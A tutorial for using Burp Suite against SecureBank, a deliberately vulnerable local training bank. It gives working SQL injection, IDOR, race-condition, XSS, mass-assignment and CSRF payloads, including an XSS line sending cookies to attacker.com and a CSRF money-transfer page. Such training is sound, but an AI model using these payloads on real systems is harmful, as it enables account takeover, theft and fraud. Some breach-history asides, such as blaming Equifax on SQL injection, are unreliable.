# 🔍 Testing SecureBank with Burp Suite

**Professional Web Application Security Testing**

Burp Suite is the industry-standard toolkit for web application security testing. This guide teaches you how to use Burp Suite to discover and exploit all 6 vulnerabilities in SecureBank, just like professional security testers do in real-world penetration tests.

---

## 📋 Table of Contents

1. [Overview](#overview)
2. [What is Burp Suite?](#what-is-burp-suite)
3. [Installation & Setup](#installation--setup)
4. [Initial Configuration](#initial-configuration)
5. [Testing SQL Injection](#testing-sql-injection)
6. [Testing IDOR](#testing-idor)
7. [Testing Race Conditions](#testing-race-conditions)
8. [Testing XSS](#testing-xss)
9. [Testing Mass Assignment](#testing-mass-assignment)
10. [Testing CSRF](#testing-csrf)
11. [Advanced Features](#advanced-features)
12. [Troubleshooting](#troubleshooting)
13. [Best Practices](#best-practices)

---

## 🎯 Overview

Burp Suite is a powerful proxy tool that sits between your browser and the web application, allowing you to intercept, inspect, and modify HTTP requests and responses. This makes it perfect for security testing because you can:

- **See everything**: All requests and responses, including hidden parameters
- **Modify anything**: Change any part of a request before it reaches the server
- **Replay attacks**: Send the same request multiple times with modifications
- **Automate testing**: Use tools like Intruder and Scanner to find vulnerabilities
- **Collaborate**: Share findings with your team

### Why Use Burp Suite for SecureBank?

Burp Suite helps you understand web vulnerabilities at a deeper level because:

1. **You see the actual HTTP traffic**: Understanding what's really happening behind the scenes
2. **You can experiment safely**: Test different attack payloads without writing code
3. **You learn professional tools**: The same tools used by security teams at major companies
4. **You develop security intuition**: Recognizing vulnerable patterns in requests

### What You'll Learn

By the end of this guide, you'll be able to:

- ✅ Set up Burp Suite and configure your browser to work with it
- ✅ Intercept and modify HTTP requests in real-time
- ✅ Use the Repeater tool to test different attack payloads
- ✅ Exploit SQL injection vulnerabilities through manual testing
- ✅ Bypass access controls using IDOR techniques
- ✅ Conduct race condition attacks with Burp's Turbo Intruder
- ✅ Find and exploit XSS vulnerabilities
- ✅ Discover hidden parameters via mass assignment
- ✅ Test CSRF protections (or lack thereof)

---

## 🔧 What is Burp Suite?

Burp Suite is a Java-based platform for security testing web applications. It was created by PortSwigger and is used by security professionals worldwide.

### Key Components

**1. Proxy**
- Intercepts HTTP/HTTPS traffic between your browser and the application
- Lets you view, pause, and modify requests before they're sent
- Captures responses for inspection
- Most commonly used component for manual testing

**2. Repeater**
- Allows you to manually modify and resend individual requests
- Perfect for testing different payloads and seeing immediate results
- Keeps a history of all modifications you've made
- Essential for exploiting vulnerabilities

**3. Intruder**
- Automated attack tool for sending many requests with different payloads
- Great for brute force, fuzzing, and race conditions
- Free version is rate-limited but still useful for learning
- Professional version is much faster

**4. Scanner** (Professional only)
- Automated vulnerability scanner
- Crawls the application and tests for common issues
- Not available in Community Edition

**5. Decoder**
- Encodes/decodes data in various formats (URL, Base64, HTML, etc.)
- Helpful for understanding encoded parameters

**6. Comparer**
- Compares two requests or responses to see differences
- Useful for finding subtle changes that indicate vulnerabilities

### Community vs Professional

**Community Edition** (Free):
- ✅ Proxy, Repeater, Decoder, Comparer
- ✅ Full manual testing capabilities
- ✅ Perfect for learning and education
- ❌ Intruder is rate-limited (slow)
- ❌ No automated scanner
- ❌ Limited extensions

**Professional Edition** ($449/year):
- ✅ Everything in Community Edition
- ✅ Fast Intruder for race conditions
- ✅ Automated vulnerability scanner
- ✅ Full extension support
- ✅ Collaborator for out-of-band testing

**For SecureBank**: The free Community Edition is sufficient for all exercises in this guide, though Professional Edition makes some tests easier.

---

## 📦 Installation & Setup

### Step 1: Install Java

Burp Suite requires Java 17 or higher.

**Check if Java is installed:**
```bash
java -version
```

**Install Java (if needed):**

**macOS:**
```bash
brew install openjdk@17
```

**Ubuntu/Debian:**
```bash
sudo apt update
sudo apt install openjdk-17-jdk
```

**Windows:**
Download from [adoptium.net](https://adoptium.net/) and run the installer.

### Step 2: Download Burp Suite

1. Visit [portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)
2. Download the version for your operating system
3. Run the installer and follow the prompts
4. Choose "Community Edition" when prompted

**Typical Installation Locations:**
- **macOS**: `/Applications/Burp Suite Community Edition.app`
- **Windows**: `C:\Program Files\BurpSuiteCommunity\BurpSuiteCommunity.exe`
- **Linux**: `/opt/BurpSuiteCommunity/BurpSuiteCommunity` or use the JAR file

### Step 3: Launch Burp Suite

**macOS/Windows:**
- Double-click the application icon

**Linux:**
```bash
java -jar burpsuite_community.jar
```

**First Launch:**
- Accept the terms and conditions
- Choose "Temporary project" (or create a named project if you want to save your work)
- Use "Burp defaults" for configuration
- Click "Start Burp"

### Step 4: Configure Your Browser

Burp Suite needs to intercept your browser traffic. The easiest way is to use a browser extension.

**Recommended: Firefox with FoxyProxy**

1. **Install Firefox** (if not already installed)
2. **Install FoxyProxy Extension**:
   - Visit [addons.mozilla.org](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)
   - Click "Add to Firefox"

3. **Configure FoxyProxy**:
   - Click the FoxyProxy icon in your browser toolbar
   - Select "Options"
   - Click "Add New Proxy"
   - Enter these settings:
     - **Title**: Burp Suite
     - **Proxy Type**: HTTP
     - **Proxy IP**: `127.0.0.1`
     - **Port**: `8080`
   - Click "Save"

4. **Enable Proxy**:
   - Click the FoxyProxy icon
   - Select "Burp Suite" from the list

**Alternative: Chrome with Proxy SwitchyOmega**

1. Install [SwitchyOmega extension](https://chrome.google.com/webstore/detail/proxy-switchyomega)
2. Configure with the same settings (127.0.0.1:8080)

### Step 5: Install Burp's CA Certificate

To intercept HTTPS traffic, you need to trust Burp's certificate.

1. **Start Burp Suite** with proxy enabled
2. **Enable proxy in your browser** (using FoxyProxy)
3. **Visit** `http://burpsuite` in your browser
4. **Click** "CA Certificate" to download `cacert.der`
5. **Install the certificate**:

**Firefox:**
- Open `Settings` → `Privacy & Security`
- Scroll to `Certificates` → Click `View Certificates`
- Click `Import` → Select the downloaded `cacert.der`
- Check "Trust this CA to identify websites"
- Click OK

**Chrome/Edge (Windows):**
- Open `Settings` → `Privacy and security` → `Security`
- Click `Manage certificates`
- Go to `Trusted Root Certification Authorities` tab
- Click `Import` → Select `cacert.der`
- Follow the wizard

**macOS (System-wide):**
```bash
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/Downloads/cacert.der
```

---

## ⚙️ Initial Configuration

### Step 1: Start SecureBank

Make sure SecureBank is running before you begin testing.

```bash
cd /path/to/aegisforgee
python securityforge_api.py
```

SecureBank should be accessible at `http://localhost:5000/apps/securebank/red/login.html`

### Step 2: Configure Burp Proxy Settings

1. In Burp Suite, go to **Proxy** → **Options**
2. Verify that the **Proxy Listener** is running on `127.0.0.1:8080`
3. Enable **"Intercept is on"** in the **Proxy** → **Intercept** tab

### Step 3: Test Your Setup

1. **Enable proxy** in your browser (FoxyProxy → Burp Suite)
2. **Visit** `http://localhost:5000/apps/securebank/red/login.html`
3. **Check Burp** - You should see the request in the **Proxy** → **HTTP history** tab

**Screenshot Placeholder**: [Burp Suite Proxy HTTP History showing SecureBank login request]

If you see the request, congratulations! Your setup is working.

### Step 4: Configure Target Scope

To focus on SecureBank only:

1. Go to **Target** → **Scope**
2. Click **Add** in the "Include in scope" section
3. Enter:
   - **Protocol**: `http`
   - **Host**: `localhost`
   - **Port**: `5000`
   - **File**: `^/apps/securebank/.*`
4. Click **OK**
5. Go to **Proxy** → **Options** → **Intercept Client Requests**
6. Check **"And URL is in target scope"**

This ensures Burp only intercepts SecureBank traffic, not other sites.

---

## 💉 Testing SQL Injection

SQL injection is one of the most critical vulnerabilities. Let's use Burp Suite to exploit it in SecureBank's login page.

### Understanding the Vulnerability

SecureBank's Red Team login concatenates user input directly into SQL queries:

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

This allows attackers to break out of the query and inject their own SQL.

### Step 1: Capture the Login Request

1. **Enable intercept** in Burp: **Proxy** → **Intercept** → **Intercept is on**
2. **Navigate** to `http://localhost:5000/apps/securebank/red/login.html`
3. **Enter credentials**:
   - Username: `test`
   - Password: `test`
4. **Click Login**
5. **Check Burp** - You should see the intercepted POST request

**Screenshot Placeholder**: [Burp Proxy showing intercepted login POST request]

### Step 2: Send to Repeater

1. **Right-click** on the intercepted request
2. **Select** "Send to Repeater"
3. **Click** "Forward" to let the original request through
4. **Turn off intercept** (click "Intercept is off")
5. **Go to** the **Repeater** tab

### Step 3: Analyze the Request

The request should look like this:

```http
POST /apps/securebank/api/red/auth/login HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Content-Length: 45

{"username":"test","password":"test"}
```

**Key observations**:
- Request method: POST
- Content-Type: application/json
- Data is sent in JSON format
- Username and password are the injection points

### Step 4: Test Basic SQL Injection

Modify the username to include a SQL injection payload.

**Original:**
```json
{"username":"test","password":"test"}
```

**Modified (SQL injection):**
```json
{"username":"admin' OR '1'='1","password":"anything"}
```

**Click "Send"** and observe the response.

**Screenshot Placeholder**: [Burp Repeater showing successful SQL injection with admin user data returned]

### Step 5: Understand Why This Works

The injected query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

Breaking it down:
- `username = 'admin'` - First condition
- `OR '1'='1'` - This is ALWAYS true
- Because of OR logic, the entire condition is true
- The password check is bypassed
- Returns the admin user without knowing the password

### Step 6: Extract All Users

Let's use SQL injection to extract all usernames from the database.

**Payload:**
```json
{"username":"' OR '1'='1' --","password":""}
```

The `--` is a SQL comment that ignores everything after it.

**Resulting query:**
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = ''
```

The password check is commented out, returning all users.

### Step 7: Use Intruder for Automated Testing

You can use Burp Intruder to test multiple SQL injection payloads automatically.

1. **Send the request to Intruder** (right-click → Send to Intruder)
2. **Go to Positions tab**
3. **Clear all** markers (§)
4. **Select** just the username value `test`
5. **Click** "Add §" to mark it as injection point
6. **Go to Payloads tab**
7. **Add payloads**:
   ```
   admin' OR '1'='1
   admin' OR '1'='1' --
   admin'--
   ' OR '1'='1' --
   ' OR 1=1 --
   ' UNION SELECT NULL--
   ```
8. **Click** "Start attack"

**Screenshot Placeholder**: [Burp Intruder results showing which payloads successfully bypassed authentication]

### Expected Results

**Successful injection indicators**:
- HTTP 200 response
- Response contains user data
- Different content length than failed attempts
- `success: true` in JSON response

**Failed injection indicators**:
- HTTP 401 Unauthorized
- `success: false` in response
- Error message about invalid credentials

### Real-World Context

SQL injection in login forms is extremely common:
- **2017**: Equifax breach exposed 147 million records due to SQL injection
- **2019**: Multiple government databases breached via SQL injection
- **2020**: Freepik (graphic resources site) exposed 8.3 million records

Attackers use this to:
- Bypass authentication (as we just did)
- Steal entire databases
- Modify or delete data
- Gain administrative access

---

## 🔓 Testing IDOR

Insecure Direct Object References (IDOR) occur when an application uses user-supplied input to directly access objects without proper authorization. SecureBank's account viewing feature is vulnerable.

### Understanding the Vulnerability

The accounts endpoint uses an `account_id` parameter:

```
GET /apps/securebank/api/red/accounts/1
```

The application doesn't verify that the logged-in user owns account #1. We can access any account by changing the ID.

### Step 1: Login and Access Your Account

1. **Login** as a regular user: `alice` / `password123`
2. **Navigate** to the Accounts page
3. **Observe** in Burp HTTP History the account request

### Step 2: Identify the IDOR Request

In Burp **Proxy** → **HTTP history**, find:

```http
GET /apps/securebank/api/red/accounts/2 HTTP/1.1
Host: localhost:5000
Cookie: session=eyJ1c2VyX2lkIjoxfQ...
```

**Key elements**:
- `/accounts/2` - Alice's account ID is 2
- Cookie contains session information
- GET request with no additional authorization checks

### Step 3: Send to Repeater

1. **Right-click** the request → **Send to Repeater**
2. **Go to** Repeater tab

### Step 4: Test IDOR by Changing Account ID

**Original request:**
```http
GET /apps/securebank/api/red/accounts/2 HTTP/1.1
```

**Modified request (access account 1):**
```http
GET /apps/securebank/api/red/accounts/1 HTTP/1.1
```

**Click Send**

**Screenshot Placeholder**: [Burp Repeater showing successful access to another user's account data]

### Step 5: Enumerate All Accounts

Use Burp Intruder to find all valid accounts:

1. **Send to Intruder**
2. **Clear all markers** and select just the account ID number
3. **Set payload type** to "Numbers"
4. **Configure**:
   - From: 1
   - To: 100
   - Step: 1
5. **Start attack**

**Screenshot Placeholder**: [Burp Intruder results showing multiple account IDs with different response lengths]

### Step 6: Analyze Results

**Successful access** (200 OK):
```json
{
  "success": true,
  "account": {
    "id": 1,
    "user_id": 1,
    "account_number": "1000000001",
    "account_type": "checking",
    "balance": 25000.00,
    "username": "admin"
  }
}
```

**Failed access** (404 Not Found):
```json
{
  "success": false,
  "error": "Account not found"
}
```

### Expected Results

You should successfully access:
- Account 1 (admin): $25,000 balance
- Account 2 (alice): $5,000 balance
- Account 3 (bob): $3,000 balance
- Account 4 (charlie): $10,000 balance

### Real-World Context

IDOR vulnerabilities have caused major breaches:
- **Facebook** (2018): Exposed access tokens of 50 million users
- **USPS** (2018): 60 million users' data exposed
- **Venmo** (2019): Public transaction feed exposed private data

Attackers exploit IDOR to:
- Access other users' private information
- Modify or delete data they shouldn't control
- Escalate privileges
- Steal sensitive financial data

---

## ⏱️ Testing Race Conditions

Race conditions occur when an application doesn't properly handle concurrent requests, allowing attackers to exploit timing windows. SecureBank's transfer feature has this vulnerability.

### Understanding the Vulnerability

The transfer endpoint has a "check-then-act" pattern:

```python
# Check balance
if account.balance >= amount:
    # Deduct money (vulnerable window)
    account.balance -= amount
    # Add to recipient
    recipient.balance += amount
```

If we send multiple requests simultaneously, they all pass the balance check before any deduction occurs.

### Step 1: Perform a Normal Transfer

1. **Login** as Alice (account balance: $5,000)
2. **Go to** Transfer page
3. **Transfer $100** to Bob's account
4. **Capture the request** in Burp

### Step 2: Analyze the Transfer Request

```http
POST /apps/securebank/api/red/transfer HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Cookie: session=...

{
  "from_account_id": 2,
  "to_account_id": 3,
  "amount": 100,
  "note": "Payment"
}
```

### Step 3: Send to Repeater (Test Single Request)

1. **Send to Repeater**
2. **Change amount** to $1000
3. **Send** the request

**First request succeeds** (Alice has $5000):
```json
{
  "success": true,
  "message": "Transfer completed",
  "new_balance": 4000.00
}
```

### Step 4: Prepare Race Condition Attack

To exploit the race condition, we need to send multiple requests simultaneously. Burp Intruder can do this.

**Method 1: Using Repeater (Manual)**

1. **Keep the request in Repeater**
2. **Open multiple Repeater tabs** (Ctrl+R to duplicate)
3. **Click Send** on all tabs as quickly as possible

This is difficult to time correctly.

**Method 2: Using Intruder (Better)**

1. **Send to Intruder**
2. **Go to Positions** → Clear all markers
3. **Go to Payloads** → Set payload to "Null payloads"
4. **Set** "Generate 10 payloads"
5. **Go to Options** → Find "Request Engine"
6. **Set**:
   - Thread count: 10
   - Throttle: 0ms
7. **Start attack**

**Screenshot Placeholder**: [Burp Intruder configured for race condition attack with 10 concurrent threads]

### Step 5: Execute Race Condition Attack

**Attack scenario**: Alice has $5000. We'll try to transfer $4000 ten times simultaneously.

**Original balance**: $5,000
**Per transfer**: $4,000
**Expected after 10 requests**: -$35,000 (overdrawn, should be blocked)
**Actual result**: Multiple transfers succeed due to race condition

### Step 6: Analyze Results

In **Community Edition**, the rate limiting makes this harder. In **Professional Edition**, you'll see:

**Response 1-3 (Success)**:
```json
{
  "success": true,
  "new_balance": 1000.00  // First successful transfer
}
```

**Response 4-10 (Should fail, but some succeed)**:
```json
{
  "success": true,
  "new_balance": -3000.00  // Negative balance - exploitation successful!
}
```

### Method 3: Using Turbo Intruder (Professional Only)

Turbo Intruder is a Burp extension optimized for race conditions.

1. **Install** from BApp Store (Extender → BApp Store)
2. **Right-click** request → Extensions → Turbo Intruder → Send to Turbo Intruder
3. **Use this script**:

```python
def queueRequests(target, wordlists):
    # Send 10 concurrent requests
    for i in range(10):
        engine.queue(target.req, gate='race1')
    
    # Release all at once
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Expected Results

**Successful race condition**:
- Multiple transfers complete despite insufficient funds
- Account goes into negative balance
- Money is "created" from thin air

**Why this is critical**:
- Attackers can withdraw more money than they have
- Banking system loses money
- Trust and regulatory compliance issues

### Real-World Context

Race condition exploits in financial applications:
- **2016**: Bitcoin exchange lost thousands due to race conditions in withdrawal system
- **2020**: DeFi protocol lost $25M to flash loan race condition attack
- **2021**: Multiple cryptocurrency exchanges patched race condition bugs

---

## 🚨 Testing XSS

Cross-Site Scripting (XSS) allows attackers to inject malicious JavaScript into web pages viewed by other users. SecureBank's transaction notes feature is vulnerable.

### Understanding the Vulnerability

The application doesn't sanitize transaction notes before displaying them:

```javascript
noteCell.innerHTML = transaction.note;  // Dangerous!
```

This allows JavaScript execution when the note is displayed.

### Step 1: Create a Transaction with XSS Payload

1. **Login** as Alice
2. **Go to** Transfer page
3. **Make a transfer** with this note:
   ```html
   <img src=x onerror=alert('XSS')>
   ```

### Step 2: Capture the Request in Burp

```http
POST /apps/securebank/api/red/transfer HTTP/1.1
Host: localhost:5000
Content-Type: application/json

{
  "from_account_id": 2,
  "to_account_id": 3,
  "amount": 1,
  "note": "<img src=x onerror=alert('XSS')>"
}
```

### Step 3: Test Different XSS Payloads in Repeater

**Send to Repeater** and try various payloads:

**Basic alert**:
```json
{"note": "<script>alert('XSS')</script>"}
```

**Image tag** (more likely to work):
```json
{"note": "<img src=x onerror=alert('XSS')>"}
```

**SVG** (bypasses some filters):
```json
{"note": "<svg onload=alert('XSS')>"}
```

**Event handler**:
```json
{"note": "<body onload=alert('XSS')>"}
```

### Step 4: Steal Session Cookies (Advanced)

Real attackers use XSS to steal session cookies:

```json
{"note": "<img src=x onerror=\"fetch('http://attacker.com/steal?cookie='+document.cookie)\">"}
```

**Screenshot Placeholder**: [Burp Repeater showing XSS payload being injected into transaction note]

### Step 5: Test Reflected XSS

Check if any GET parameters reflect user input:

1. **Browse** SecureBank with Burp proxy enabled
2. **Look for** URLs with parameters like `?search=`, `?error=`, `?message=`
3. **Test** by adding `<script>alert('XSS')</script>` to parameter values
4. **Use Repeater** to refine payloads

### Step 6: Use Intruder for XSS Fuzzing

1. **Send a transaction request to Intruder**
2. **Mark the note field** as injection point
3. **Load** XSS payload list:
   - Burp comes with built-in XSS payloads
   - Go to Payloads → Payload Options
   - Load → Burp → FuzzDB → XSS
4. **Start attack**
5. **Filter results** by response length to find successful payloads

**Screenshot Placeholder**: [Burp Intruder XSS fuzzing results highlighting successful payloads]

### Expected Results

**Successful XSS**:
- JavaScript executes when viewing transactions
- Alert box appears (for basic payloads)
- Cookie is stolen (for advanced payloads)
- No error messages

**Failed XSS**:
- Payload appears as text (HTML escaped)
- No JavaScript execution
- May see encoded characters like `&lt;` instead of `<`

### Real-World Context

XSS has been found in major platforms:
- **British Airways** (2018): XSS led to credit card theft affecting 380,000 transactions
- **eBay** (2016): Stored XSS allowed attackers to phish user credentials
- **Twitter** (2010): XSS worm spread to millions of users

Attackers use XSS to:
- Steal session cookies and hijack accounts
- Redirect users to phishing pages
- Inject keyloggers to capture passwords
- Deface websites
- Spread malware

---

## ⚙️ Testing Mass Assignment

Mass assignment occurs when applications blindly accept all user-submitted parameters without filtering. SecureBank's profile update feature is vulnerable.

### Understanding the Vulnerability

The profile update endpoint accepts JSON data and updates all provided fields:

```python
for key, value in data.items():
    setattr(user, key, value)  # Dangerous! No whitelist
```

This allows users to modify fields that shouldn't be editable, like `is_admin`.

### Step 1: Capture Normal Profile Update

1. **Login** as Alice (regular user)
2. **Go to** Profile page
3. **Update** your name to "Alice Smith"
4. **Capture** the request in Burp

### Step 2: Analyze the Request

```http
POST /apps/securebank/api/red/users/profile HTTP/1.1
Host: localhost:5000
Content-Type: application/json

{
  "full_name": "Alice Smith",
  "email": "alice@example.com"
}
```

**Current user data** (from GET /api/red/users/me):
```json
{
  "id": 2,
  "username": "alice",
  "full_name": "Alice Smith",
  "email": "alice@example.com",
  "is_admin": false  // ← We want to change this!
}
```

### Step 3: Send to Repeater and Add Hidden Field

**Original request**:
```json
{
  "full_name": "Alice Smith",
  "email": "alice@example.com"
}
```

**Modified request (mass assignment attack)**:
```json
{
  "full_name": "Alice Smith",
  "email": "alice@example.com",
  "is_admin": true
}
```

**Click Send**

**Screenshot Placeholder**: [Burp Repeater showing mass assignment payload with is_admin field added]

### Step 4: Verify Privilege Escalation

Make a request to get your user profile:

```http
GET /apps/securebank/api/red/users/me HTTP/1.1
```

**Response**:
```json
{
  "id": 2,
  "username": "alice",
  "full_name": "Alice Smith",
  "email": "alice@example.com",
  "is_admin": true  // ← Success! We're now admin
}
```

### Step 5: Test Other Hidden Parameters

Try discovering and modifying other hidden fields:

**Attempt 1: Change balance**
```json
{
  "full_name": "Alice Smith",
  "balance": 1000000
}
```

**Attempt 2: Change user ID**
```json
{
  "full_name": "Alice Smith",
  "user_id": 1
}
```

**Attempt 3: Change username**
```json
{
  "full_name": "Alice Smith",
  "username": "admin"
}
```

### Step 6: Use Intruder to Discover Hidden Fields

Create a request with placeholder fields:

```json
{
  "full_name": "Alice Smith",
  "§field§": "§value§"
}
```

**Payloads (Pitchfork attack)**:
- Field names: `is_admin`, `role`, `balance`, `account_type`, `user_id`
- Values: `true`, `admin`, `999999`, `premium`, `1`

**Screenshot Placeholder**: [Burp Intruder results showing which hidden fields were successfully modified]

### Expected Results

**Successful mass assignment**:
- `is_admin` changes to `true`
- User gains administrative privileges
- No error messages
- Changes persist after logout/login

**Failed attempts**:
- Field is ignored (no change)
- Error message about invalid field
- Field is read-only

### Real-World Context

Mass assignment vulnerabilities:
- **GitHub** (2012): Allowed users to add themselves to any repository
- **Ruby on Rails apps** (2012): Many apps were vulnerable before Rails added protection
- **Multiple APIs**: Common in REST APIs that accept JSON

Attackers use mass assignment to:
- Escalate privileges (regular user → admin)
- Modify prices (e-commerce)
- Change account balances
- Bypass payment requirements

---

## 🔐 Testing CSRF

Cross-Site Request Forgery (CSRF) tricks authenticated users into performing unwanted actions. SecureBank's settings page lacks CSRF protection.

### Understanding the Vulnerability

The settings update endpoint doesn't validate request origin:

```python
@app.route('/api/red/settings', methods=['POST'])
def update_settings():
    # No CSRF token check!
    data = request.get_json()
    # Update settings...
```

An attacker can create a malicious page that sends requests on behalf of the logged-in user.

### Step 1: Capture Settings Update Request

1. **Login** as Alice
2. **Go to** Settings page
3. **Change** notification preferences
4. **Capture** the request in Burp

### Step 2: Analyze the Request

```http
POST /apps/securebank/api/red/settings HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Cookie: session=eyJ1c2VyX2lkIjoxfQ...

{
  "email_notifications": true,
  "sms_notifications": false
}
```

**Key observations**:
- No CSRF token in request
- Only requires valid session cookie
- Browser will send cookie automatically to localhost:5000

### Step 3: Create CSRF Proof of Concept

**Send to Repeater** and then **right-click** → **Engagement tools** → **Generate CSRF PoC**

Burp will generate HTML like this:

```html
<html>
  <body>
    <form action="http://localhost:5000/apps/securebank/api/red/settings" method="POST" enctype="application/json">
      <input type="hidden" name="email_notifications" value="false" />
      <input type="hidden" name="sms_notifications" value="false" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Screenshot Placeholder**: [Burp CSRF PoC Generator showing generated HTML attack page]

### Step 4: Test CSRF Attack

1. **Copy** the generated HTML
2. **Save** as `csrf_attack.html`
3. **Ensure** you're logged into SecureBank in your browser
4. **Open** `csrf_attack.html` in the same browser

**Expected result**: Settings are changed without your explicit consent!

### Step 5: Create More Malicious CSRF Attacks

**CSRF to transfer money**:

```html
<html>
  <body>
    <script>
      fetch('http://localhost:5000/apps/securebank/api/red/transfer', {
        method: 'POST',
        credentials: 'include',  // Include session cookie
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          from_account_id: 2,  // Victim's account
          to_account_id: 5,    // Attacker's account
          amount: 1000,
          note: 'CSRF attack'
        })
      });
    </script>
  </body>
</html>
```

### Step 6: Test CSRF Token Validation (Blue Team)

Switch to the Blue Team version and try the same attack:

```http
POST /apps/securebank/api/blue/settings HTTP/1.1
```

**Response**:
```json
{
  "success": false,
  "error": "Invalid CSRF token"
}
```

The Blue Team version requires a CSRF token!

### Expected Results

**Red Team (Vulnerable)**:
- CSRF attack succeeds
- Settings/transfers complete without explicit user action
- No token validation

**Blue Team (Secure)**:
- CSRF attack fails
- Error message about missing/invalid CSRF token
- Requests must include valid token

### Real-World Context

CSRF vulnerabilities have affected major platforms:
- **YouTube** (2008): CSRF allowed adding videos to any user's favorites
- **Netflix** (2006): CSRF enabled adding DVDs to queues
- **ING Direct** (2007): Money transfer via CSRF

Attackers use CSRF to:
- Transfer money from victim's account
- Change account settings (email, password)
- Make purchases
- Post content as the victim
- Change privacy settings

---

## 🚀 Advanced Features

### HTTP History Analysis

The **Proxy** → **HTTP history** tab is valuable for:

**Finding attack surfaces**:
- Sort by URL to see all endpoints
- Filter by status code (200, 403, 500)
- Look for parameters in URLs and bodies

**Comparing requests**:
- Right-click two requests → "Compare"
- See exactly what changed between authenticated/unauthenticated requests

### Using Burp Decoder

**Decode** encoded parameters:

1. **Find** a base64-encoded value (like session cookies)
2. **Copy** the value
3. **Go to** Decoder tab
4. **Paste** the value
5. **Select** "Decode as..." → "Base64"

**Example**: Decode SecureBank session cookie:
```
Input:  eyJ1c2VyX2lkIjoxfQ==
Output: {"user_id":1}
```

### Comparing Responses

Use **Comparer** to find differences:

1. **Select** two responses in HTTP history
2. **Right-click** → "Send to Comparer"
3. **Go to** Comparer tab
4. **Click** "Words" or "Bytes" to see differences

**Use case**: Compare Red Team vs Blue Team responses to see security differences.

### Saving Your Work

**Save project**:
- File → New Project → "Project on disk"
- Choose location and name
- All history, requests, and findings are saved

**Export requests**:
- Right-click request → "Copy as curl command"
- Use in scripts or documentation

### Burp Extensions

Install useful extensions from **Extender** → **BApp Store**:

- **Autorize**: Test authorization issues automatically
- **CSRF Scanner**: Enhanced CSRF detection
- **J2EEScan**: Java application security testing
- **Retire.js**: Find vulnerable JavaScript libraries

---

## 🔧 Troubleshooting

### Browser Can't Connect

**Symptom**: "Unable to connect" or "Proxy server refusing connections"

**Solutions**:
1. Check Burp is running
2. Verify proxy listener is on 127.0.0.1:8080 (Proxy → Options)
3. Confirm browser proxy is enabled (FoxyProxy)
4. Try restarting Burp

### HTTPS Certificate Warnings

**Symptom**: "Your connection is not private" warnings

**Solutions**:
1. Ensure you installed Burp's CA certificate
2. Check certificate is trusted in browser settings
3. Try regenerating CA cert (Proxy → Options → Regenerate CA certificate)

### Intercept Not Working

**Symptom**: Requests not appearing in Intercept tab

**Solutions**:
1. Check "Intercept is on" button is highlighted
2. Verify target is in scope (Proxy → Options)
3. Check intercept filters (Proxy → Options → Intercept Client Requests)

### Slow Performance

**Symptom**: Burp is very slow or freezes

**Solutions**:
1. Increase Java heap size:
   ```bash
   java -Xmx4g -jar burpsuite.jar
   ```
2. Disable unnecessary tools (Scanner, Spider)
3. Clear project history (Proxy → HTTP history → right-click → Clear)

### Intruder Rate Limited

**Symptom**: "Intruder throttled" message in Community Edition

**Expected**: Community Edition limits Intruder speed
**Solution**: Use Repeater for manual testing, or upgrade to Professional

---

## ✅ Best Practices

### Professional Security Testing

1. **Always get permission**: Only test applications you own or have authorization to test
2. **Document findings**: Take screenshots, save requests/responses
3. **Test systematically**: Work through each feature methodically
4. **Verify exploitability**: Don't just find vulnerabilities, prove they can be exploited
5. **Consider impact**: Understand the real-world consequences of each vulnerability

### Efficient Burp Usage

1. **Use keyboard shortcuts**:
   - `Ctrl+R`: Send to Repeater
   - `Ctrl+I`: Send to Intruder
   - `Ctrl+Space`: Toggle intercept
2. **Define scope**: Focus on target application only
3. **Use search**: Filter HTTP history to find specific requests
4. **Save projects**: Don't lose your work!

### Learning and Improvement

1. **Practice regularly**: Security testing is a skill that improves with practice
2. **Try different tools**: Compare Burp with ZAP, SQLMap, etc.
3. **Read writeups**: Learn from others' bug bounty reports
4. **Understand the why**: Don't just run tools, understand the vulnerabilities
5. **Test both sides**: Practice with Red Team (vulnerable) and verify Blue Team (secure) fixes

### Responsible Disclosure

If you find real vulnerabilities:
1. **Don't exploit** beyond proof of concept
2. **Report responsibly** to the organization
3. **Give time** for fixes before public disclosure
4. **Follow** bug bounty program rules if applicable

---

## 🎓 Conclusion

You've learned how to use Burp Suite to discover and exploit all 6 SecureBank vulnerabilities:

- ✅ **SQL Injection**: Bypassed authentication and extracted data
- ✅ **IDOR**: Accessed other users' accounts
- ✅ **Race Conditions**: Exploited timing windows in transfers
- ✅ **XSS**: Injected malicious JavaScript
- ✅ **Mass Assignment**: Escalated privileges to admin
- ✅ **CSRF**: Performed unauthorized actions

### Next Steps

1. **Practice more**: Try finding variations of these vulnerabilities
2. **Explore Blue Team**: See how the secure version prevents these attacks
3. **Learn other tools**: Try SQLMap (SQL injection), ZAP (automated scanning)
4. **Real-world practice**: Join bug bounty platforms like HackerOne or Bugcrowd
5. **Get certified**: Consider certifications like CEH, OSCP, or OSWE

### Additional Resources

- **PortSwigger Web Security Academy**: Free, hands-on web security training
- **OWASP Testing Guide**: Comprehensive web application testing methodology
- **Burp Suite Documentation**: Official documentation and tutorials
- **Bug Bounty Platforms**: HackerOne, Bugcrowd, Synack

**Remember**: Use these skills ethically and responsibly. Only test systems you have permission to test. Security knowledge is powerful - use it to make the internet safer!

---

**Happy (Ethical) Hacking! 🔒**
